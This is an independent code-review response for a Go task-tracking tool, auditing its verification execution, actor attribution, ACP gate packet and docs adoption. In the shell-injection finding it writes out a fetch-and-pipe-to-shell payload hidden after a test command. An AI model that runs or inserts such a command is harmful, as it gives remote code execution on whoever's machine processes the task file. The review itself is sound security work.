# Candidate review response — 2026-08-19

Reviewer: independent co-review of `reviewer-response-2026-08-18.md`, the
hardening pass it reports, and the ACP gate packet. Read-only. Nothing was
staged, committed, or run against a provider.

## Method

Every claim was checked against the current source and the live vault, not
against the report. Four adversarial reviewers covered separate surfaces with
no shared context: the verification-execution machinery, the three prior
ship-blockers, the ACP/docs-graph lane, and the regression list. The full
package suite was re-run locally and serially. This completion pass then used
eight independent source/evidence audits to challenge the counts, wording,
acceptance criteria, and test-quality judgments.

Independent reproduction and corroborating retained evidence:

| Check | Result |
|---|---|
| `go test ./cmd/tusker -count=1` | independent PASS, 1033.410s (cold cache) |
| Your retained log `tusker-cmd-authoritative-fixed.42166.json` | 2,501 unique tests, 2,498 pass, 3 skip, 0 fail, 733.069s |
| `gofmt -l cmd/tusker internal` | clean |
| `go vet ./...` | clean |
| `/private/tmp/tusker-final validate --json` | 0 errors, 136 warnings |
| `/private/tmp/tusker-final skill doctor --strict --json` | 0 errors, 98 warnings |
| Gates `ACP-G-0001/2/3` | `open`, `human:sarav`, `state_rev` unchanged, no gate event appended |
| Provider calls | none occurred in the suite; the live Codex ACP smoke skipped because `TUSKER_LIVE_CODEX_ACP=1` was unset |

The suite claim and the "no unauthorized provider call" claim both hold.

## Confirmed done

These were checked at the implementation, not the assertion.

- **Wave-boundary review readiness.** The predicate was recomputed by hand
  against all 11 wave files and the full task set: zero waves report ready,
  all five false positives gone, each for the correct reason. The irreversible
  "Land selected" affordance is closed by a `waveTerminal` guard that every
  consumer routes through — no bypass found.
  `TestServeReviewBatchRejectsHistoricalTerminalWaves` reconstructs those exact
  five waves with real member IDs and asserts the batch stays empty. That is
  the negative-direction test whose absence let the original bug ship, and it
  is the strongest single piece of work in the pass.
- **Actor attribution.** The `human:$USER` default is gone from the proposal
  path; `agentSessionKind()` is consulted at one choke point in
  `resolveV7Actor`; `--force` and `--local` do not bypass it. Tests are
  behavioral, covering mixed-case `HuMaN:` and all five agent env markers. The
  seven remaining `"human:"+defaultActorName()` sites are `owner:` and
  `next_owner` fields — assignment, not attribution. That judgment is correct.
- **Adoption safety core.** Per-source fingerprints and the whole-table digest
  are checked in preflight; CAS re-reads and byte-compares both source and
  target immediately before writing; rollback captures pre-images and restores
  in reverse.
  `--yes` and `--apply` hard-rejected. The retained 638-row inventory never
  proposes a tombstone.
- **FAC-T-0007 citation.** The fabricated `TestMapRenders` row is replaced with
  rows citing tests that exist, self-attributed `agent:luna`, with the original
  surviving only in the immutable event log. Correct outcome.
- **Departure authority.** `waveAuthorizationFingerprintActive` no longer
  substitutes for an authorization check, and `scheduled_promotion.go` re-checks
  independently on a fresh projection.
- **ACP receipt hardening.** Real. `adapter_executable_fingerprint`,
  `wrapper_executable_fingerprint`, `bundle_receipt_digest`, protocol, agent
  name/version, and the load/resume capability booleans are now emitted; the
  protocol and agent negotiation are extracted from the event log rather than
  static config; the wrapper path rejects symlinks and is re-verified after the
  run. This answers the executable-pinning part of the prior finding.
- **ACP-G-0002 admission.** Verified accurate. No `runner_acp_claude*` file
  exists in any variant; the only `claude-agent-acp` references are descriptor
  shape validation. Six `ClaudeExecutionAdapter` tests were available as an easy
  false positive and you explicitly declined them. Noted.

Also withdrawn from the prior review, on your side of the argument: the
`reviewerPolicyCoversRisk` widening is **not** a defect. It gates reviewer
dispatch only; close authority is the separate `reviewerMayAutoCloseRisk`
predicate, and `workflow_validate.go` now actively rejects the legacy
risk-as-authority config. The prior reviewer also mis-stated the digest
failure mode: open escalations are not filtered by `since`, so the 30-hour
escalation scenario does not occur.

## Blocking — do not commit as-is

### 1. Proof execution is a shell-injection surface

`cmd/tusker/v7_verification_execution.go:190` is
`exec.Command("/bin/sh", "-c", command)`, where `command` is raw free text from
a `command:` cell in a task's Markdown verification table. No argv parsing, no
sandbox. Task files arrive by git pull, delivery-plan import, or agent write.

The gate does not carry the weight its name implies:

- The reviewer identity check compares against `reviewerActorForNote`, which
  for a v7 task returns the literal string `reviewer:agent`
  (`daemon.go:6455`). `--by reviewer:agent` satisfies it. That is a flag value,
  not an authenticated identity.
- When `--confirm` is absent, the error hint prints the correct manifest hash
  to paste back (`v7_verification_execution.go:104`). The operator is never
  shown the command text at the confirm step. This is a replay guard proving
  the row set did not change between two invocations — not consent.
- The env allowlist strips `OPENAI_API_KEY` but keeps `HOME` and `PATH` with
  full filesystem access.
- `v7ShellCommandInvocations` splits on `; & |` and only recognizes whether a
  segment invokes a test, so
  `command: go test ./... ; curl -s https://host/x | sh` satisfies
  `proof_required: focused_test`.

**Acceptance:** do not execute arbitrary task-authored shell. Enforce a bounded
command contract and run it in a real sandbox (`sandbox-exec`/`bwrap`, no
network, read-only `$HOME`), with a regression that refuses a metacharacter
payload. The confirm step must display the exact command text, not only a
digest.

Credit where due: the CAS and locking here are correct — the task is reloaded
and `state_rev`-verified inside the write lock, the manifest is recomputed
under the lock, failures bind to the observed exit code, and no path records a
failure as a pass. The Serve HTTP surface is properly fail-closed because
`--confirm` cannot arrive over HTTP.

### 2. The daemon path skips the gate entirely

`cmd/tusker/review_proposal.go:312` calls `executeV7CommandVerificationRows`
with `trustedWorker=true`, which bypasses both the reviewer-identity check and
manifest confirmation. No operator action appears anywhere in the path.

It is opt-in behind authoritative completion-reactor mode with matching lane
worker policies — but for a project that has opted in, `git pull` of a branch
carrying a poisoned pending row is unattended execution on the daemon host.
`args` is `nil`, so the timeout knob is unavailable and the budget is the full
ten minutes.

**Acceptance:** either the daemon path executes nothing, or it uses the same
bounded sandbox contract from item 1; `trustedWorker` must not bypass it, and a
regression must exercise that exact path.

### 3. The documented ACP smoke burns a live turn, then fails

`runner.Start` is `runner_acp_live_smoke_test.go:137`. The dirty-tree guard in
`canonicalLiveACPSourceRevision` is reached at `:203` — after the authenticated
turn completes. The check itself is correct; its placement is not.

The source report records 216 dirty paths at its snapshot. An
operator following `acp-gate-review-packet-2026-08-18.md` verbatim today
authenticates, spends a real Codex turn, and gets `t.Fatal` on "source
repository is dirty". `$receipt` is never written, so the `jq` inspect step and
the `gate satisfy` command both fail on a missing file. The packet does not
state that a clean tree is a precondition; its offline-evidence header does not
make the live command's applicability clear. The same applies to the unstated
cwd requirement:
`TUSKER_LIVE_CODEX_ACP_VAULT` must resolve into the current working repo.

**Acceptance:** hoist the revision and cleanliness check above `runner.Start`,
add a regression proving the runner never starts on a dirty tree, and state
"requires a clean, committed tree, run from the repo root" as an explicit
precondition in the packet.

### 4. Serve's human controls are read-only the way it is actually started

`serve_command.go:129` — actor-attributed human mutations are refused unless
`TUSKER_SERVE_OPERATOR` or `TUSKER_ACTOR` is set. Started as it always has
been, the review, task, gate, and delivery controls no longer mutate. Other
surfaces with no operator-actor guard are outside this claim.

The normal daemon/launchd path cannot supply that configuration: `startServe`
has no actor argument, and the rendered plist carries only `PATH`,
`TUSKER_STATE_ROOT`, and `TUSKER_LAUNCHD`. The SPA then refuses guarded actions
with HTTP 412 because `/api/capability` reports no operator actor.

The larger problem is that the agent-session refusal is evaluated **per
request against the server process's environment**. A serve process that
inherited `CLAUDECODE` or `CODEX_THREAD_ID` from its launching shell — likely
in this workflow — refuses every mutation permanently, with a hint to "run from
a human terminal" that will not map to "the daemon started three days ago has a
stale env var." A long-lived server's launch environment is not a signal about
who is clicking in the browser.

Separately, `configuredServeOperatorActor` validates a qualified `human:` actor
but does not route through `resolveV7Actor`, so the startup path accepts an
agent-launched process that the per-request path then refuses. Reconcile them
deliberately rather than by relaxing the per-request check.

**Acceptance:** carry explicit operator provenance into daemon/launchd startup
and evaluate the agent-session boundary once there, or add non-forgeable
request/session identity. A request-body actor alone is not authentication.
Cover launchd and stale inherited agent environment in tests, and release-note
the behavior break.

## Fix before the feature is usable

### 5. Adoption skip list matches whole paths, not path components

`docs_adopt_cmd.go:679` uses `relative == prefix || HasPrefix(relative, prefix+"/")`.
`node_modules` is in the list; the real path is
`internal/serve/ui/node_modules/…`, which matches nothing.

Measured in the retained dry run: **533 of 638 proposals are node_modules files,
24 of them live `promote` rows.** An approved table would create
`docs/system/security-policy.md` from `highlight.js/SECURITY.md`, and one
cytoscape PR template yields a 40-word slug. `.github`, `dist`, `build`, and
`vendor` have the same hole when nested. `docsAdoptLeave`'s `.github` guard
shares the bug.

**Fix:** split on `/` and test each path component.

### 6. The `---` subject fallback is unfixed at the root

`docsAdoptSubject` still falls back to the first non-empty line, which for a
file whose front matter parses but carries no `subject:` key is the literal
`---`. The review snapshot's source scan found 63 files resolving to
`subject: "---"`, including all of
`docs/specs/*.md`. They are saved only by the downstream multi-file collision
check. Adopt or delete 62 of them and the 63rd promotes to
`docs/system/untitled.md` — the original bug, one file away.

### 7. The spec-updates rule still cannot fire on this repo

The strict same-commit rule at `v7_docs_validation.go:151` is real and has
genuine git-fixture tests — that criticism was answered properly. But it is
bypassed whenever `relatedTask` is true, and `containsDocUpdateMarker`
(`:379`) is a substring match for `documentation` / `doc update` across the
task's title **and full body**. The fallback,
`docTargetChangedAfterSpec` (`:203`), is the old heuristic: it requires only
that the target's last commit descend from the spec's authority commit.

Evaluated against git for all three locked specs carrying `updates:`, the
strict rule fails on **6 of 7 pairs**, yet `validate` emits zero
`SPEC_UPDATES_*` findings — unchanged from before the fix. Nine of ten tasks
referencing `knowledge-graph.md` contain the word "documentation".

`TestLockedSpecUpdatesAcceptTaskBackedLaterGitEdit` encodes the escape hatch as
desired behavior, so this is a design decision to revisit, not an oversight.
`SPEC_UPDATES_PENDING` severity is genuinely fixed. `docUpdatedAfterSpec` is
now dead code.

### 8. Gate packet defects

- `docs/delivery/acp-gate-review-packet-2026-08-18.md:39,42` filter on
  `ACPConformance` and report PASS. **No test function in the repo matches that
  name.** The commands pass because the other alternations match. An operator
  reads this as proven conformance coverage; there is none, and the prior
  audit's `_meta` and evidence-acceptance conformance gaps therefore remain
  open.
- The inspect step shows `adapter_executable_fingerprint`; the
  `gate satisfy --evidence` step omits it and `wrapper_executable_fingerprint`.
  The durable gate record is weaker than what the human reviewed, while the
  gate's own action text names the pinned fingerprint.
- The packet points at `/private/tmp/tusker-prime-candidate` (`c8368adb…`)
  while `reviewer-response-2026-08-18.md` vouches for `/private/tmp/tusker-final`
  (`80d654d8…`). Both exist on disk. Pick one.
- `capabilities` is a two-field subset (`load_session`, `resume_session`), not
  a negotiated capability set.

### 9. Smaller, confirmed

- **`status: ready` with blank `readiness` bypasses the spec-ref policy.**
  `v7_traceability.go:154` returns false when `readiness != "ready"`, and
  `validateV7TaskReadiness` has no case for `""`. The `status ready` command is
  safe because it synthesizes both fields; a hand-edited, imported, or migrated
  task file is not. Latent today — no task in the vault exploits it. The tier-1
  warning split and the two-severity unification are both properly fixed.
- **Bare `tusker dashboard` still writes** (`v7_migration_cmd.go:102`,
  `case "build", "":`), and it is a mutating build/migration path, not a
  read-only view. `writeV7DashboardLandingNote` can overwrite a hand-edited
  `Dashboard.md` that matches its generated-file heuristics. No test covers the
  read-only property.
- **`v7TaskWaveID` still ranges a map** (`v7_state_runtime.go:598`). Mostly
  unreachable now via the task back-pointer and the open-wave conflict check,
  but a malformed or imported task with a blank/stale back-pointer that is
  listed by both a landed and an open wave can still flip the Wave column
  between runs and reorder the committed review-queue dashboard. The added
  `sort.Slice` sorts output; it does not make the value deterministic.
- **Digest drops landed work across an unattended gap.** `digestSinceFromArgs`
  returns a non-empty last-24-hours override, so a stale watermark never widens
  the CLI window. Work landed or closed before that window can be omitted while
  the CLI still advances the watermark. Serve's empty-query handler does use
  the watermark, so the two surfaces disagree.
- **Dead file:** `internal/serve/ui/src/features/work/ProjectWork.tsx` has zero
  importers. No longer diverging (BatchBar is extracted and shared), so it is
  housekeeping, not a hazard. Delete it.

## Claims to correct in the report

Three statements overstate what the code does. The rest of the document is
accurate, and the limits section is well drawn.

- **"Forged PASS rows are rejected."** The new guard refuses a non-`pending`
  result only when the check parses as a command, only through `verify add`.
  A hand-written row in the Markdown still reads as verified — the receipt
  (`tusker gate executed at …; exit=0; output_sha256=…`) is plain text in the
  Notes cell with no key, no signature, and no reader anywhere in the codebase,
  and `computeV7ProofReport` never inspects it. `state_rev` is an unkeyed
  hash, not an integrity token. And
  `verify add --check "manual proof: I ran the suite" --result pass` is
  untouched. One forgery path closed; the file-edit and non-command paths
  remain open. Suggested wording: **"`verify add` rejects non-pending command
  rows; Markdown edits and manual-proof rows remain outside this guard."**
- **"Actor correction is append-only… existing historical records are
  immutable."** Accurate as far as it goes, and not rewriting them was the
  right call — but the disposition table's framing implies they are marked.
  They are not. `AGX-P-0001` and `SRV-P-0002` still carry bare
  `reviewed_by: "human:sarav"`, 14 event files carry the same actor, there is
  no correction record, and `actorCorrectionApplyCmd` is a permanent stub
  returning `HUMAN_CONTROL_RECEIPT_UNAVAILABLE`. The honest phrasing is
  "intact and unflagged, with a plan-only tool that cannot apply."
- **"`last_verified`/runtime observability were dormant… an evidence
  boundary."** These are two different things. Runtime observability is empty
  because nobody authorized a provider run — a legitimate boundary.
  `describes:` and `last_verified:` are empty (0 and 0, confirmed) because
  nobody has written the front matter the feature consumes. That is unshipped
  adoption. The doc-touch rule short-circuits without `describes:`. `docs status`
  still reports never-verified documents and coverage gaps, but cannot
  compute path freshness. Suggested wording: **"Runtime observations are empty
  because no provider run was authorized; documentation freshness metadata is
  unadopted, so doc-touch enforcement is dormant while `docs status` reports
  only never-verified and coverage-gap signals."**

## Test-quality notes

Most new tests are genuinely behavioral — real git repos, real commits, real
stdout capture, adversarial cases with must-not-run sentinels. Five are
tautologies that assert source text rather than behavior:

- `internal/serve/ui/tests/wave-review.test.ts:23` — `readFileSync` +
  `toContain('task.status === "done" && task.waveTerminal')`. It proves a source
  literal exists, not that the predicate behaves correctly. The Go coverage
  carries this fix.
- `internal/serve/ui/tests/ops-route.test.ts:7` — asserts router source
  literals; never mounts the route or the component.
- `TestDocTouchCheckOnReactorClose` (`scratch_retention_test.go:531`) — greps
  Go source for a literal call string.
- `TestReviewerCanReviewRiskExcludedFromAutoClose`
  (`orc_reviewer_traceability_test.go:9`) and
  `TestDigestSinceDefaultsToLastDayAndSupportsExplicitAll`
  (`v7_escalation_digest_test.go:275`) assert their predicates definitionally
  and never touch the paths those predicates gate.

Missing coverage that maps onto live findings: no test that a hand-written
`pass` row with a fabricated receipt is rejected; no test of the
`trustedWorker=true` daemon path; no test that a stale `pass` is re-verified
against a newer `source_sha`; nothing covering `v7TaskWaveID` or bare
`dashboard` being read-only.

## Out of scope for the team

These are the operator's calls, not engineering's, and are correctly identified
in your brief: authorizing or deferring the three ACP gates; populating
`describes:` and `last_verified:` across the canonical docs; measuring the
worktree cap and disk floor; domains-retirement timing; tracker reconciliation
policy for the ~50 ORC and 8 ACP tasks describing shipped work; and whether
zero warnings rather than zero errors is a release gate.

## Bottom line

Real work, honestly reported in most places, and the response to the prior
round's criticism was substantive rather than cosmetic. Items 1 through 4 block
a commit. Items 5 through 8 make three shipped features unusable or misleading
in this repo. Nothing found requires rearchitecting; the fixes are local.

One housekeeping item before any commit: `internal/serve/ui/dist/` carries
tracked deletions alongside untracked replacements. It needs `git add -A` there
or the embed ships broken.
